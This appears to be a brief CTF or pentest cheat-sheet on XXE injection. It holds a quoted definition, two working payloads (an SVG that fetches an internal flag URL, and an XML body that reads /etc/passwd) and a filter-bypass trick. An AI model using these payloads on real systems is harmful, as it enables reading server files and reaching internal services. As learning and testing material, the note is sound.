# XXE (XML eXternal Entity)
> XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

> In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

## Example Payloads
```xml
<?xml version="1.0"?>
<!DOCTYPE test[
    <!ENTITY xxe SYSTEM "http://goober-internal:5001/flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="150" height="150">
<text x="15" y="20" font-size="4px">&xxe;</text>
</svg>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Obviously you must be able to adapt lah...

Eg. Blacklist bypasses are similar to SQLi: `!DOC!DOCTYPETYPE`

## Resources
- [Portswigger](https://portswigger.net/web-security/xxe)